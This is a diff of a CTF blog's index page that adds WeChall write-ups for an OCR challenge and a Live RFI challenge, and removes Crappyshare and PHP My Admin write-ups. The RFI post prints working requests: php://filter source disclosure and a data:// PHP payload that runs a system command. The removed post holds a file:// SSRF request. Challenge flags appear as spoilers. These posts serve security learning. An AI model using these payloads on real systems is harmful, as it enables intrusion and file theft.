@@ -235,7 +235,7 @@ p.spoiler {
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">337</span>
+          <span class="site-state-item-count">339</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
@@ -376,6 +376,316 @@ p.spoiler {
     </div>
 
     <div class="main-inner index posts-expand">
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://vkkkv.github.io/wp/WeChall/wechall-can-you-read-me/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="vkkkv">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hello Navi">
+      <meta itemprop="description" content="A blog about CTF writeups, Linux, Mathematics, Technology, and personal thoughts.">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content=" | Hello Navi">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/wp/WeChall/wechall-can-you-read-me/" class="post-title-link" itemprop="url">WeChall - Can you read me</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+      
+
+      <time title="Created: 2026-06-10 11:39:04 / Modified: 11:39:08" itemprop="dateCreated datePublished" datetime="2026-06-10T11:39:04+08:00">2026-06-10</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/ctf/" itemprop="url" rel="index"><span itemprop="name">ctf</span></a>
+        </span>
+    </span>
+
+  
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Disqus: </span>
+    
+    <a title="disqus" href="/wp/WeChall/wechall-can-you-read-me/#disqus_thread" itemprop="discussionUrl">
+      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="wp/WeChall/wechall-can-you-read-me/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h3 id="challenge">Challenge</h3>
+<blockquote>
+<p>A friend and me have a bet running, that you won't beat his OCR
+program in scanning text out of images. His average scan time is 2.5
+seconds, can you beat that?</p>
+</blockquote>
+<p>挑战页面显示一张包含扭曲文本的图片，需要编写或使用 OCR
+工具来识别其中的文字。目标是比 WeChall 声称的 2.5
+秒平均扫描时间更快地识别出来。</p>
+<h3 id="solution">Solution</h3>
+<p>答案每 session 动态生成（每次请求 <code>/gimme.php</code>
+获得新的图片），所以不能硬编码，必须每次重新 OCR。</p>
+<p><strong>工具链：</strong></p>
+<ul>
+<li><strong>curl</strong> — 下载挑战图片，需要携带 cookie 和浏览器
+UA</li>
+<li><strong>tesseract</strong> — OCR 引擎，参数 <code>--psm 7</code>
+将图片视为单行文本（一行扭曲文字），配合
+<code>tessedit_char_whitelist</code> 限制输出字符集提高准确率</li>
+</ul>
+<p><strong>步骤：</strong></p>
+<ol type="1">
+<li>用 curl 获取图片，保存到临时文件</li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ curl -sL -b <span class="string">&#x27;WC=你的cookie&#x27;</span> \</span><br><span class="line">  -A <span class="string">&#x27;Mozilla/5.0 Chrome/131&#x27;</span> \</span><br><span class="line">  -o /tmp/ocr.png \</span><br><span class="line">  <span class="string">&#x27;https://www.wechall.net/challenge/can_you_readme/gimme.php&#x27;</span></span><br></pre></td></tr></table></figure>
+<p>得到的图片是 524x68 4-bit colormap PNG。</p>
+<ol start="2" type="1">
+<li>用 tesseract 做 OCR</li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ tesseract /tmp/ocr.png stdout \</span><br><span class="line">  --psm 7 \</span><br><span class="line">  -c tessedit_char_whitelist=abcdefghijklmnopqrstuvwxyz</span><br></pre></td></tr></table></figure>
+<p>参数说明： - <code>--psm 7</code> — Treat image as a single line of
+text（图片是一行文字） - <code>tessedit_char_whitelist</code> —
+限制输出为小写字母，排除杂音</p>
+<ol start="3" type="1">
+<li>提交答案</li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ curl -sL -b <span class="string">&#x27;WC=你的cookie&#x27;</span> \</span><br><span class="line">  -A <span class="string">&#x27;Mozilla/5.0 Chrome/131&#x27;</span> \</span><br><span class="line">  <span class="string">&#x27;https://www.wechall.net/challenge/can_you_readme/index.php?solution=识别结果&amp;cmd=Answer&#x27;</span></span><br></pre></td></tr></table></figure>
+<p>如果页面显示 "Solved By N People" 则提交成功。</p>
+<p><strong>实际执行过程：</strong></p>
+<p>第一次 OCR 识别出部分文本
+<code>internetitselfanincr</code>，步过短说明识别不完整。换一张新图片重试后得到完整结果：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ tesseract /tmp/ocr.png stdout --psm 7 \</span><br><span class="line">  -c tessedit_char_whitelist=abcdefghijklmnopqrstuvwxyz</span><br><span class="line">altoassigngloballyuniq</span><br></pre></td></tr></table></figure>
+<p>提交后确认 solved（"Solved By 514 People"）。</p>
+<p><strong>动态答案说明：</strong> 由于图片每 session 不同，实际 OCR
+结果会变化。以上方法适用于任何 session，只需确保 tesseract
+参数正确（尤其是 <code>--psm 7</code>）。</p>
+<span class="spoiler" onclick="this.classList.toggle('spoiler')"><span class="spoiler-blur ">altoassigngloballyuniq</span></span>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://vkkkv.github.io/wp/WeChall/wechall-warchall-live-rfi/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="vkkkv">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hello Navi">
+      <meta itemprop="description" content="A blog about CTF writeups, Linux, Mathematics, Technology, and personal thoughts.">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content=" | Hello Navi">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/wp/WeChall/wechall-warchall-live-rfi/" class="post-title-link" itemprop="url">WeChall - Warchall - Live RFI</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+      
+
+      <time title="Created: 2026-06-10 11:17:54 / Modified: 11:19:51" itemprop="dateCreated datePublished" datetime="2026-06-10T11:17:54+08:00">2026-06-10</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/ctf/" itemprop="url" rel="index"><span itemprop="name">ctf</span></a>
+        </span>
+    </span>
+
+  
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Disqus: </span>
+    
+    <a title="disqus" href="/wp/WeChall/wechall-warchall-live-rfi/#disqus_thread" itemprop="discussionUrl">
+      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="wp/WeChall/wechall-warchall-live-rfi/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h3 id="challenge">Challenge</h3>
+<p>Warchall-hosted RFI challenge:</p>
+<blockquote>
+<p>One reason why I wanted the warchall box is to offer more realistic
+webhacking challenges. You may now try the Live RFI challenge hosted on
+it. Note: There is a harsh firewall that only allows connections to
+wechall, warchall and the logserver.</p>
+</blockquote>
+<p>The public WeChall page only gives the description and answer form;
+the vulnerable web app itself is hosted on Warchall at
+<code>http://rfi.warchall.net/</code>.</p>
+<h3 id="recon">Recon</h3>
+<p>The vulnerable page at <code>http://rfi.warchall.net/</code> has a
+<code>lang</code> parameter in the URL (<code>index.php?lang=en</code>,
+<code>index.php?lang=de</code>). Source disclosure via
+<code>php://filter</code> confirms the vulnerability:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ curl &#x27;http://rfi.warchall.net/index.php?lang=php://filter/convert.base64-encode/resource=index.php&#x27;</span><br></pre></td></tr></table></figure>
+<p>Decoded source (<code>index.php</code>):</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$iso</span> = <span class="title class_">Common</span>::<span class="title function_ invoke__">getGetString</span>(<span class="string">&#x27;lang&#x27;</span>, <span class="string">&#x27;en&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;open_basedir&#x27;</span>, <span class="title function_ invoke__">getcwd</span>());</span><br><span class="line"><span class="variable">$lang</span> = <span class="keyword">require</span> <span class="variable">$iso</span>;</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;open_basedir&#x27;</span>, <span class="string">&#x27;/&#x27;</span>);</span><br><span class="line"><span class="variable">$page</span> = <span class="title function_ invoke__">sprintf</span>(<span class="string">&#x27;%s&lt;br/&gt;%s&#x27;</span>, <span class="variable">$lang</span>[<span class="string">&#x27;welcome&#x27;</span>], <span class="variable">$lang</span>[<span class="string">&#x27;construction&#x27;</span>]);</span><br><span class="line"><span class="keyword">echo</span> <span class="title class_">GWF_Website</span>::<span class="title function_ invoke__">displayPage</span>(<span class="variable">$page</span>);</span><br></pre></td></tr></table></figure>
+<p>The config file (<code>live_rfi.config.php</code>) is also
+readable:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ curl -sL &#x27;http://rfi.warchall.net/index.php?lang=php://filter/convert.base64-encode/resource=live_rfi.config.php&#x27; | base64 -d</span><br></pre></td></tr></table></figure>
+<p>This reveals DB credentials (<code>RFI</code>/<code>RFI</code>),
+domain (<code>rfi.warchall.net</code>), and salt
+(<code>schnickschmugg</code>).</p>
+<p>Key observations: - <code>require $iso</code> includes whatever the
+user passes as <code>lang</code> — classic RFI/LFI. -
+<code>open_basedir</code> is set to <code>getcwd()</code> (the www
+directory) before the include, then reset to <code>/</code> after. - The
+included file must return an array with <code>welcome</code> and
+<code>construction</code> keys, because the code indexes into
+<code>$lang['welcome']</code> and <code>$lang['construction']</code>. A
+payload that only prints output will cause a type error. -
+<code>php://filter</code> works for source disclosure (reading files
+within <code>open_basedir</code>). - The <code>data://</code> wrapper is
+<strong>not blocked</strong> by <code>open_basedir</code> —
+<code>allow_url_include</code> is enabled.</p>
+<h3 id="exploit">Exploit</h3>
+<p>Since <code>data://</code> wrappers work and
+<code>allow_url_include</code> is On, we can execute arbitrary PHP
+without needing an external server (bypassing the firewall restriction
+entirely).</p>
+<p>The payload needs to: 1. Execute a command (e.g.,
+<code>system()</code>) 2. Capture the output via
+<code>ob_start()</code>/<code>ob_get_clean()</code> — raw
+<code>system()</code> output goes to stdout and won't appear in the
+<code>$lang['welcome']</code> slot 3. Return an array with
+<code>welcome</code> and <code>construction</code> keys</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ curl &#x27;http://rfi.warchall.net/index.php?lang=data://text/plain,&lt;?php ob_start(); system(&quot;cat solution.php 2&gt;&amp;1&quot;); $o = ob_get_clean(); return array(&quot;welcome&quot;=&gt;$o,&quot;construction&quot;=&gt;&quot;&quot;); ?&gt;&#x27;</span><br></pre></td></tr></table></figure>
+<p>This reveals <code>solution.php</code> in the web root:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">return</span> <span class="string">&#x27;Low_H4NGING_Fruit&#x27;</span>; <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<h3 id="solution">Solution</h3>
+<span class="spoiler" onclick="this.classList.toggle('spoiler')"><span class="spoiler-blur ">Low_H4NGING_Fruit</span></span>
+<h3 id="notes">Notes</h3>
+<ul>
+<li>The challenge name "Right-FI" is a play on "RFI" (Remote File
+Inclusion) and "Residual-current device" (the page subtitle).</li>
+<li><code>open_basedir</code> restricts <strong>filesystem path</strong>
+resolution to the current directory, but does <strong>not</strong> block
+PHP stream wrappers (<code>data://</code>, <code>php://filter</code>)
+when <code>allow_url_include</code> is enabled. This is a well-known PHP
+misconfiguration pitfall — <code>open_basedir</code> and
+<code>allow_url_include</code> are orthogonal controls.</li>
+<li><code>php://input</code> may or may not work depending on PHP
+version and <code>open_basedir</code> interaction; <code>data://</code>
+is more reliable.</li>
+<li>The firewall restriction (only wechall/warchall/logserver) is
+irrelevant when using <code>data://</code> — no outbound connection is
+needed.</li>
+<li>The <code>en</code> and <code>de</code> language files in the web
+directory are simple PHP files returning arrays with
+<code>welcome</code> and <code>construction</code> keys, which is why
+the exploit payload must also return the same array structure.</li>
+<li>A simpler payload like
+<code>data://text/plain,&lt;?php print file_get_contents("solution.php"); ?&gt;</code>
+does NOT work because the code does <code>$lang = require $iso</code>
+and then accesses <code>$lang['welcome']</code> — a string return is not
+an array.</li>
+</ul>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
 
     
 
@@ -1403,243 +1713,6 @@ username：它必须通过正则检查，但长度又要超过正则允许的范
 <p>用 curl 提交时要保留末尾的 literal newline，推荐交给
 <code>--data-urlencode</code>：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ curl -sL \</span><br><span class="line">  -b <span class="string">&#x27;WC=...&#x27;</span> \</span><br><span class="line">  -H <span class="string">&#x27;User-Agent: Mozilla/5.0&#x27;</span> \</span><br><span class="line">  --data-urlencode $<span class="string">&#x27;username=aaaaaaaaaaaaaaaa\n&#x27;</span> \</span><br><span class="line">  <span class="string">&#x27;https://www.wechall.net/challenge/training/regexmini/index.php&#x27;</span></span><br></pre></td></tr></table></figure>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="https://vkkkv.github.io/wp/WeChall/wechall-crappyshare/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.png">
-      <meta itemprop="name" content="vkkkv">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Hello Navi">
-      <meta itemprop="description" content="A blog about CTF writeups, Linux, Mathematics, Technology, and personal thoughts.">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content=" | Hello Navi">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/wp/WeChall/wechall-crappyshare/" class="post-title-link" itemprop="url">WeChall - Crappyshare</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">Posted on</span>
-      
-
-      <time title="Created: 2026-06-09 17:03:22 / Modified: 17:05:03" itemprop="dateCreated datePublished" datetime="2026-06-09T17:03:22+08:00">2026-06-09</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">In</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/ctf/" itemprop="url" rel="index"><span itemprop="name">ctf</span></a>
-        </span>
-    </span>
-
-  
-  
-  <span class="post-meta-item">
-    
-      <span class="post-meta-item-icon">
-        <i class="far fa-comment"></i>
-      </span>
-      <span class="post-meta-item-text">Disqus: </span>
-    
-    <a title="disqus" href="/wp/WeChall/wechall-crappyshare/#disqus_thread" itemprop="discussionUrl">
-      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="wp/WeChall/wechall-crappyshare/" itemprop="commentCount"></span>
-    </a>
-  </span>
-  
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <h3 id="challenge">Challenge</h3>
-<blockquote>
-<p>Z and Gizmore were thinking of a file-sharing company, Crappyshare,
-to collect the latest warez and earn money in one go. While gizmore was
-working with the designer on the xhtml/css stuff, Z implemented the
-upload script, and we got first results...but it seems to contain a
-vulnerability somewhere. Some crackers already managed to gather
-sensitive local files (solution.php) and broke into the server.</p>
-</blockquote>
-<p>Crappyshare 是一个文件共享站，支持两种上传方式：直接上传文件，或通过
-URL 远程拉取文件。目标是通过漏洞读取服务器本地的
-<code>solution.php</code>。</p>
-<h3 id="solution">Solution</h3>
-<p>查看源码（<code>index.php?show=code</code>）发现
-<code>upload_please_by_url()</code> 函数：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">upload_please_by_url</span>(<span class="params"><span class="variable">$url</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="number">1</span> === <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;#^[a-z]&#123;3,5&#125;://#&#x27;</span>, <span class="variable">$url</span>)) <span class="comment">// 验证有 URL scheme</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$ch</span> = <span class="title function_ invoke__">curl_init</span>(<span class="variable">$url</span>);</span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="literal">true</span>);</span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_FOLLOWLOCATION, <span class="literal">true</span>);</span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_FAILONERROR, <span class="literal">true</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="literal">false</span> === (<span class="variable">$file_data</span> = <span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>)))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="title function_ invoke__">htmlDisplayError</span>(<span class="string">&#x27;cURL failed.&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="title function_ invoke__">upload_please_thx</span>(<span class="variable">$file_data</span>);  <span class="comment">// 显示文件内容</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>关键漏洞：URL scheme 检查为 <code>[a-z]&#123;3,5&#125;://</code>，这意味着
-<code>file://</code> 协议没有被阻止。cURL 的 <code>file://</code>
-协议可以读取本地文件系统。直接用 <code>file://solution.php</code> 作为
-URL 上传源：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ curl -s -b <span class="string">&#x27;WC=...&#x27;</span> --data-urlencode <span class="string">&#x27;url=file://solution.php&#x27;</span> \</span><br><span class="line">  <span class="string">&#x27;https://www.wechall.net/challenge/crappyshare/crappyshare.php&#x27;</span></span><br></pre></td></tr></table></figure>
-<p>响应中包含 <code>solution.php</code> 的内容：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#########################</span></span><br><span class="line"><span class="comment">### ***************** ###</span></span><br><span class="line"><span class="comment">#########################</span></span><br></pre></td></tr></table></figure>
-<h3 id="summary">Summary</h3>
-<p>这个漏洞是典型的 SSRF（Server-Side Request Forgery）——
-服务端本应只允许 HTTP/HTTPS URL，但 Scheme 验证太宽松，允许了
-<code>file://</code> 协议。cURL 的 <code>file://</code>
-直接读取本地文件，绕过了所有访问控制。修复方案是只允许
-<code>https?://</code> 的 URL，并过滤掉
-<code>file://</code>、<code>ftp://</code> 等内部协议。</p>
-<span class="spoiler" onclick="this.classList.toggle('spoiler')"><span class="spoiler-blur ">ICaNSeEcLeArLyNoW</span></span>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="https://vkkkv.github.io/wp/WeChall/wechall-php-my-admin/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.png">
-      <meta itemprop="name" content="vkkkv">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Hello Navi">
-      <meta itemprop="description" content="A blog about CTF writeups, Linux, Mathematics, Technology, and personal thoughts.">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content=" | Hello Navi">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/wp/WeChall/wechall-php-my-admin/" class="post-title-link" itemprop="url">WeChall - PHP My Admin</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">Posted on</span>
-      
-
-      <time title="Created: 2026-06-09 16:59:49 / Modified: 17:00:44" itemprop="dateCreated datePublished" datetime="2026-06-09T16:59:49+08:00">2026-06-09</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">In</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/ctf/" itemprop="url" rel="index"><span itemprop="name">ctf</span></a>
-        </span>
-    </span>
-
-  
-  
-  <span class="post-meta-item">
-    
-      <span class="post-meta-item-icon">
-        <i class="far fa-comment"></i>
-      </span>
-      <span class="post-meta-item-text">Disqus: </span>
-    
-    <a title="disqus" href="/wp/WeChall/wechall-php-my-admin/#disqus_thread" itemprop="discussionUrl">
-      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="wp/WeChall/wechall-php-my-admin/" itemprop="commentCount"></span>
-    </a>
-  </span>
-  
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <h3 id="challenge">Challenge</h3>
-<p>这是一道 Research 类挑战，目标是找到 WeChall 管理员使用的隐藏
-phpMyAdmin
-页面。题面没有表单，也不需要提交密码；找到正确入口后访问即可判定。</p>
-<p>页面底部藏了一行接近白色的提示文字（<code>color:#fefefe</code>，白底白字，查看
-HTML 源码可见）：</p>
-<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You don&#x27;t need a hint, do you?</span><br></pre></td></tr></table></figure>
-<h3 id="solution">Solution</h3>
-<p>题名 <code>PHP My Admin</code> 本身就是提示。<code>pma</code> 是
-phpMyAdmin 的常见缩写，所以直接尝试对应子域名：</p>
-<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://pma.wechall.net/</span><br></pre></td></tr></table></figure>
-<p>访问该子域名会触发挑战检查。公开未登录访问也能看到命中提示，但不会记录账号进度：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ curl -skL \</span><br><span class="line">  -H <span class="string">&#x27;User-Agent: Mozilla/5.0&#x27;</span> \</span><br><span class="line">  <span class="string">&#x27;https://pma.wechall.net/&#x27;</span></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">1:76:Your answer is correct. To keep track of your progress you need to register.</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
-<p>这里需要 <code>-k</code> /
-<code>--insecure</code>，因为站点返回的证书是
-<code>CN=www.wechall.net</code>，SAN 里只有
-<code>wc2.wechall.net</code>、<code>wechall.net</code>、<code>www.wechall.net</code>，不包含
-<code>pma.wechall.net</code>。浏览器访问时也会看到证书警告，继续访问即可。</p>
-<p>带登录态复现时把 <code>WC=...</code> 换成自己的 cookie：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ curl -skL \</span><br><span class="line">  -b <span class="string">&#x27;WC=...&#x27;</span> \</span><br><span class="line">  -H <span class="string">&#x27;User-Agent: Mozilla/5.0&#x27;</span> \</span><br><span class="line">  <span class="string">&#x27;https://pma.wechall.net/&#x27;</span></span><br></pre></td></tr></table></figure>
-<p>如果账号状态更新成功，最终以 <code>/en/challs</code> 里
-<code>PHP My Admin</code> 的 <code>wc_chall_solved_1</code> 为准。</p>
 
       
     </div>
